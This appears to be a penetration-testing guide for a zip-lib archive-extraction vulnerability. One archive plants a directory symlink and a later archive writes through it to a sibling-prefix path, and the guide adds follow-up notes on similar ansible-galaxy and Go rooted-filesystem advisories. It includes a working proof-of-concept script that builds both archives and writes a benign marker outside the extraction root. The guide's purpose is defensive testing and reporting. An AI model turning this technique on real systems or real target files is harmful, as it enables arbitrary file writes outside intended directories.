---
title: zip-lib multi-stage symlink and path-prefix extraction boundary
---

# zip-lib multi-stage symlink and path-prefix extraction boundary

GHSA-73hr-7685-xwj3 / CVE-2026-17524 exposes a reusable archive-testing pattern: one extraction creates a directory symlink, then a later extraction into the same destination writes through that persisted link. The first fix added real-path checks for existing symlink directories, but compared paths as raw string prefixes. A sibling directory whose name begins with the extraction root can therefore be mistaken for a child until the comparison is made component-aware.

Sources:

- [GHSA-73hr-7685-xwj3 / CVE-2026-17524](https://github.com/advisories/GHSA-73hr-7685-xwj3)
- [zip-lib issue 14: multi-archive symlink write](https://github.com/fpsqdb/zip-lib/issues/14)
- [Initial symlink-folder fix](https://github.com/fpsqdb/zip-lib/commit/0c29b1e17050f2611f4f37e6aaa92a60b3cb89d5)
- [Component-aware follow-up fix](https://github.com/fpsqdb/zip-lib/commit/7263fa93daa96d940ab48050311d76c923525ba7)
- [zip-lib 1.2.1 release](https://github.com/fpsqdb/zip-lib/releases/tag/v1.2.1)
- [NVD record for CVE-2026-17524](https://nvd.nist.gov/vuln/detail/CVE-2026-17524)

The unreviewed GHSA published on July 28 says versions before `1.1.0` are affected. A disposable Linux fixture run for this page reproduced an outside-root marker write in `1.0.0`, `1.1.0`, `1.1.1`, `1.1.2`, and `1.2.0` when the outside directory was a lexical sibling-prefix of the extraction root. The same fixture was rejected by `1.2.1` through `1.4.0`. Treat that as a precise tested representation, not a replacement affected-range claim: record the installed artifact, platform, options, destination spelling, symlink target, and fixed-build control in every report.

!!! warning "Disposable extraction root only"
    Run this only in a temporary directory on an isolated Linux test host. Use one benign text marker and a sibling directory created for the test. Never target home directories, application roots, package hooks, startup files, credentials, or executable paths. Do not run untrusted archives on production systems.

## Preconditions and inputs

Confirm all of these before testing:

- the application invokes `zip-lib` extraction on attacker-controlled or tenant-controlled ZIP content;
- two or more archives, jobs, retries, or resumptions can reuse one destination directory;
- symlink entries are materialized on the tested platform and extraction options do not intentionally store them as ordinary files;
- the process can create symlinks and write to the selected disposable sibling directory;
- the exact package version and resolved package tree are captured with `npm list zip-lib --depth=0`;
- the test destination contains no real application or user data.

Package presence alone is not enough. The exploit path is **persistent extraction destination + symlink-bearing first stage + later descendant entry + final canonical path outside the destination**.

## Build a marker-only two-stage fixture

The following creates `out/` and its sibling `outside/`. The first archive contains only `pivot -> ../outside`; the second contains only `pivot/proof.txt`. The payload is a fixed benign string.

```bash
mkdir zip-lib-boundary-lab
cd zip-lib-boundary-lab
npm init -y
npm install zip-lib@1.0.0

mkdir out outside
python3 - <<'PY'
import stat
import zipfile

with zipfile.ZipFile("stage1.zip", "w", zipfile.ZIP_DEFLATED) as archive:
    entry = zipfile.ZipInfo("pivot")
    entry.create_system = 3
    entry.external_attr = (stat.S_IFLNK | 0o777) << 16
    archive.writestr(entry, "../outside")

with zipfile.ZipFile("stage2.zip", "w", zipfile.ZIP_DEFLATED) as archive:
    archive.writestr("pivot/proof.txt", "ZIP_LIB_BOUNDARY_CANARY\n")
PY

cat > run.js <<'JS'
const zl = require("zip-lib");

(async () => {
  await zl.extract("stage1.zip", "out", { symlinkAsFileOnWindows: false });
  await zl.extract("stage2.zip", "out", { symlinkAsFileOnWindows: false });
})().catch((error) => {
  console.error(`${error.name}:${error.message}`);
  process.exit(2);
});
JS

node run.js
test -f outside/proof.txt
sha256sum outside/proof.txt
```

For the exact marker above, the expected SHA-256 is:

```text
f70741a799a13633f10b3103dbc76e563241ab364d0a6a94491dcbd6e2aa5fde
```

Capture the archive listings, `lstat`/`realpath` of `out/pivot`, destination and sibling paths, process exit code, marker hash, and filesystem write trace. Do not retain a reusable hostile archive after the engagement.

## Separate the two bugs with a representation matrix

Test absolute containment and lexical-prefix containment separately:

| Variant | Symlink target | What it tests | Safe expected control |
| --- | --- | --- | --- |
| child | `child` below `out/` | normal in-root extraction | marker remains under `out/` |
| ordinary outside sibling | a sibling whose name does not begin with `out` | initial real-path confinement | extraction rejects the later write |
| sibling-prefix | `../outside` while root is `out` | raw `indexOf(...) === 0` confusion | component-aware builds reject |
| broken symlink | nonexistent disposable sibling | error handling | no outside marker |
| symlink stored as file | platform/option-specific file behavior | reachability negative control | no traversal through a directory link |
| fresh destination per archive | different output roots | state-reuse precondition | second stage cannot traverse the first stage's link |

The initial fix checked whether `realpath.indexOf(realTargetFolder) === 0`. For paths such as `/tmp/lab/out` and `/tmp/lab/outside`, that expression reports a prefix even though the latter is not a descendant. The later fix routes this decision through the library's component-aware `isOutside` helper. Preserve both canonical paths in evidence; the marker alone does not explain which guard failed.

## Affected-versus-control replay

Use a fresh extraction root for every version and do not reuse `node_modules` evidence without recording the resolved package:

1. Run the two-stage fixture against the version actually used by the target integration.
2. Record whether stage one creates a symlink and whether stage two exits successfully, raises `AFWRITE`, or fails earlier.
3. Remove only the disposable marker and symlink, then recreate empty `out/` and `outside/` directories.
4. Install `zip-lib@1.2.1` or a newer known control and repeat the identical fixture.
5. Confirm that the control returns an outside-write refusal and leaves `outside/proof.txt` absent.
6. Repeat with a fresh destination per archive to prove whether cross-job destination reuse is required by the application.

The page's Linux version matrix was:

| Versions tested | Sibling-prefix marker | Observed result |
| --- | --- | --- |
| `1.0.0`, `1.1.0`, `1.1.1`, `1.1.2`, `1.2.0` | present | process completed and marker appeared outside `out/` |
| `1.2.1` through `1.4.0` | absent | `AFWRITE` refusal on the second-stage entry |

Do not generalize this table to Windows, alternate symlink options, downstream forks, or vendor backports without replay. The test specifically covers a relative directory symlink to a disposable sibling-prefix path on Linux.

## Extend the technique to other extractors

Apply the same workflow when reviewing upload processors, package importers, backup restore jobs, CI artifact unpackers, and desktop archive tools:

- split link creation and descendant writes across separate archives or requests;
- reuse a destination across jobs, retries, queue workers, or resumed imports;
- compare a clean destination with a pre-seeded symlink destination;
- include sibling-prefix names such as `root` versus `root-canary`, not only `../` and absolute paths;
- vary slash style, case, Unicode normalization, trailing separators, and nonexistent targets where the platform makes them relevant;
- trace the final opened path rather than trusting the archive entry name or joined lexical path;
- require a fixed-version or component-aware containment control.

Archive validation must bind every write to the canonical destination at the moment of use. A clean first-pass scan or a cache scoped to one archive does not protect a destination whose filesystem state persists into the next extraction.

## Reporting checklist

Include:

- application feature, authentication state, and proof that an untrusted ZIP reaches extraction;
- exact `zip-lib` package version, lockfile resolution, Node version, OS, and extraction options;
- whether destination directories persist across archives, users, retries, or workers;
- stage-one and stage-two archive hashes and redacted listings;
- lexical root, canonical root, symlink target, canonical destination, and sibling-prefix relationship;
- process exit codes, `AFWRITE` output where applicable, marker hash, and cleanup evidence;
- affected and fixed/control results using the identical two-stage fixture;
- a bounded impact statement: outside-root text-file write within the extractor user's existing permissions, not automatically code execution or persistence.

A strong finding is **attacker-controlled first archive creates a directory symlink in a reusable extraction root -> later archive writes a benign descendant entry -> canonical destination resolves to a disposable sibling directory -> component-aware control rejects the same sequence**.

## October 9 00:3xZ follow-up: `abspath`-vs-`realpath` again in ansible-galaxy, and junction-last-component mkdir escape in Go's rooted FS (2 legs)

The lexical-vs-canonical theme this page was built on keeps reproducing in tools nobody thinks of as extractors:

- **ansible-core `ansible-galaxy collection install`** [GHSA-4jhw-j7jr-j479](https://github.com/advisories/GHSA-4jhw-j7jr-j479) / CVE-2026-89091 (high): the collection tarball extractor validates member paths with **lexical normalization (`os.path.abspath`) instead of symlink resolution (`os.path.realpath`)**, and performs **no containment check on symlink-typed directory members before creating them**. A crafted collection chains symlink directory entries so a later file member lands outside the destination — arbitrary file write as the user running `ansible-galaxy`, control-node code execution. Explicitly a **bypass of the fix for CVE-2020-10691**: the same product, same class, six-year-old patch, still lexical. Operator angle: on engagements where an automation/CI control node installs collections or roles from shared hubs or repo-pinned requirements files, a trusted-looking collection is an extraction fixture — prove with a two-stage marker in a disposable install root, and check whether the *same extractor helper* is reused by other ansible surfaces (fix-parity sweep).
- **Go `io/fs`-style rooted filesystems** [GHSA-c3q7-m35p-9qq7](https://github.com/advisories/GHSA-c3q7-m35p-9qq7) / CVE-2026-56857 (Windows): when the target of `Root.Mkdir`/`MkdirAll` is a **junction pointing to an empty location**, the operation creates the directory **at the junction target even outside the root** — but only when the junction is the **last path component** (`path/to/junction`, not `path/junction/target`). Reusable axes: (1) **Windows junctions are the escape primitive for every "rooted" filesystem abstraction** — this page's sibling-prefix/symlink battery gains a junction variant on the final component, with an *empty* target (the containment check sees nothing where it creates something); (2) test last-component and intermediate-component link positions **separately** — many containment fixes cover one position and miss the other, and this advisory is precisely the missed position.

Same fixture discipline as the rest of the page: disposable roots, marker files, pre-seeded junction/symlink destinations, affected-vs-patched replay, and never a real config or shell-startup target.